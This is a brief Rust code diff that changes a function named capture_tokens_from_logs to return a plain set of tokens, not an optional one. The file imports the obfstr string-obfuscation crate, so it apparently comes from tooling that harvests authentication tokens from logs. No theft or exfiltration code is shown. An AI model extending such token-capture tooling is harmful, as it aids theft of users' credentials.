@@ -17,7 +17,7 @@ use regex::Regex;
 use obfstr::obfstr;
 
 
-pub fn capture_tokens_from_logs() -> Result<Option<HashSet<String>>> {
+pub fn capture_tokens_from_logs() -> Result<HashSet<String>> {
 
     let mut temp_buffer: Vec<u8> = vec![];
 
@@ -67,9 +67,5 @@ pub fn capture_tokens_from_logs() -> Result<Option<HashSet<String>>> {
         }
     }
 
-    if tokens.is_empty() {
-        return Ok(None)
-    } 
-
-    Ok(Some(tokens))
+    Ok(tokens)
 }
